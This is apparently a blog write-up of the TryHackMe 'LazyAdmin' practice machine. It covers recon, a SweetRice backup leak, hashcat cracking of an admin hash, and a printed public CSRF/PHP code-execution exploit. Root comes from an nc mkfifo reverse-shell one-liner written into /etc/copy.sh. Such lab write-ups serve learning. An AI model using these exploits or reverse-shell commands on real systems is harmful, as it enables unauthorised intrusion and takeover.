---
layout: post
title: "[THM] LazyAdmin"
date: 2022-12-27 08:46:18 +0000
categories: Writeups
excerpt: "LazyAdmin is an easy machine on Try Hack Me which involves web application exploitation. "
header:
  teaser: "/assets/LazyAdmin/LazyAdmin.jpg"
---

![LazyAdmin]({{ site.url }}{{ site.baseurl }}/assets/LazyAdmin/LazyAdmin.jpg)

LazyAdmin is an easy machine on TryHackMe. While the box is relatively simple, it was fun and was enough of a challenge to keep me hooked till I completed it. So, let’s get into it!

### [RECON]
---
Start off with the first step in every CTF, Nmap. I just used a simple aggressive scan to get the information I needed.

```
$ nmap -A 10.10.29.220                  	 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-26 20:00 GMT
Nmap scan report for 10.10.29.220
Host is up (0.076s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT   	ADDRESS
1   27.69 ms  10.9.0.1
2   101.61 ms 10.10.29.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```

The Nmap scan shows that the HTTP service is running on port 80, so I went to check out the website and found the default Apache page. From there, I used a tool called Gobuster which can bruteforce the website for directories.

```
$ gobuster dir -u 10.10.29.220 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                 	http://10.10.29.220
[+] Method:              	GET
[+] Threads:             	10
[+] Wordlist:            	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:          	gobuster/3.3
[+] Timeout:             	10s
===============================================================
2022/12/26 20:14:23 Starting gobuster in directory enumeration mode
===============================================================
/content          	(Status: 301) [Size: 314] [--> http://10.10.29.220/content/]
```
I found the /content directory, so let’s check it out.

### [Enumeration]
---
![](https://Reece4.github.io/assets/LazyAdmin/sweetrice.png)\
The CMS is running SweetRice, I had never heard of this service before, so I decided to use searchsploit to see if there are any vulnerabilities for it.
```
$ searchsploit sweetrice   
------------------------------------------- ---------------------------------
 Exploit Title                         	|  Path
------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion	| php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download  | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload	| php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure    	| php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary  | php/webapps/14184.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Turns out there are some! Most interesting one to me was the Backup Disclosure so I decided to read more about it.
```
$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```
This basically says that you can download all the mysql files for the website at the address: http://(ip address)/inc/mysql_backup.

![](https://Reece4.github.io/assets/LazyAdmin/mysqlpage.png)

Scrolling through the file, it’s not difficult to find a username and a hashed password using MD5 encryption, so I simply decrypted the password using hashcat and now I have user login credentials for the website.

![](https://Reece4.github.io/assets/LazyAdmin/admincreds.png)

```
$ sudo hashcat -m0 hash /usr/share/wordlists/rockyou.txt
[sudo] password for reece:
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1441/2946 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (2Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

42f749ade7f9e195bf475f37a44cafcb:Password123         	 

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Mon Dec 26 20:32:24 2022 (1 sec)
Time.Estimated...: Mon Dec 26 20:32:25 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   306.8 kH/s (0.16ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 33792/14344385 (0.24%)
Rejected.........: 0/33792 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: dyesebel -> redlips
Hardware.Mon.#1..: Util: 23%

Started: Mon Dec 26 20:31:55 2022
Stopped: Mon Dec 26 20:32:27 2022

```

Now to find the login page. For that, I just went back to Gobuster and looked for pages in the /content directory.
```
$ gobuster dir -u 10.10.29.220/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                 	http://10.10.29.220/content
[+] Method:              	GET
[+] Threads:             	10
[+] Wordlist:            	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:          	gobuster/3.3
[+] Timeout:             	10s
===============================================================
2022/12/26 20:33:52 Starting gobuster in directory enumeration mode
===============================================================
/images           	(Status: 301) [Size: 321] [--> http://10.10.29.220/content/images/]                                                            	 
/js               	(Status: 301) [Size: 317] [--> http://10.10.29.220/content/js/]                                                                	 
/inc              	(Status: 301) [Size: 318] [--> http://10.10.29.220/content/inc/]                                                               	 
/as               	(Status: 301) [Size: 317] [--> http://10.10.29.220/content/as/]                                                                	 
/_themes          	(Status: 301) [Size: 322] [--> http://10.10.29.220/content/_themes/]                                                           	 
/attachment       	(Status: 301) [Size: 325] [--> http://10.10.29.220/content/attachment/]
```
After looking through some of the directories, I found that the /content/as directory has the login page.
![](https://Reece4.github.io/assets/LazyAdmin/loginpage.png)

### [Exploitation]
---
Logging in with the credentials I found earlier, I was able to identify the SweetRice version is 1.5.1. So looking back at my searchsploit results, I found this arbritary code execution exploit:
```
$ cat /usr/share/exploitdb/exploits/php/webapps/40700.html
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```
This says that you are able to upload PHP files to the ads section on the website. So, I downloaded a PHP reverse shell from [github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), changed the IP address and port as specified, and uploaded it as an ad.

![](https://Reece4.github.io/assets/LazyAdmin/phpreverseshell.png)\
I then set up a netcat listener and navigated to the URI of the newly added ad.\
![](https://Reece4.github.io/assets/LazyAdmin/phpadlistener.png)\
And just like that, we have user access! Now we can get the user flag with the command “cat user.txt”.

### [Privilege Escalation]
---
Now that I had user access, it’s time to get root. To do this, the first step is nearly always to run the command “sudo -l” and see what we get.
```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
	(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
This showed me that I could run the file “backup.pl”, so I wanted to check out what it was.
```
$ ls -al /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
$ file /home/itguy/backup.pl
/home/itguy/backup.pl: a /usr/bin/perl script, ASCII text executable                                           	 
$ cat /home/itguy/backup.pl                                                                                    	 
#!/usr/bin/perl                                                                                                	 

system("sh", "/etc/copy.sh");
```
So, “backup.pl” is an executable file that runs the bash script “/etc/copy.sh”, interesting. Now to look at that file!
```
$ cat /etc/copy.sh                                                                                             	 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f                               	 
$ nano /etc/copy.sh                                                                                            	 
Unable to create directory /var/www/.nano: Permission denied                                                   	 
It is required for saving/loading search history or cursor positions.                                          	 

Press Enter to continue                                                                                        	 

Error opening terminal: unknown.      
```
For some reason, the file contains a reverse shell script so all we need to do is edit the file and add our own IP address and port to give us the reverse connection. However, I cannot seem to use nano or vim, so unfortunately, I had to use echo. So, I just copied the reverse shell script, changed the IP address and port, and used echo to add it to the file.
```
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.17.181 4445 >/tmp/f" > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```
Finally, I ran the “backup.pl” file using sudo, along with setting up another netcat listener for the reverse connection and got root!
```
$ nc -lnvp 4445      	 
listening on [any] 4445 ...
connect to [10.9.17.181] from (UNKNOWN) [10.10.29.220] 36216
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
Woohoo! Everything worked flawlessly! This box was great fun to mess around with and I hope you were able to learn something from this box.
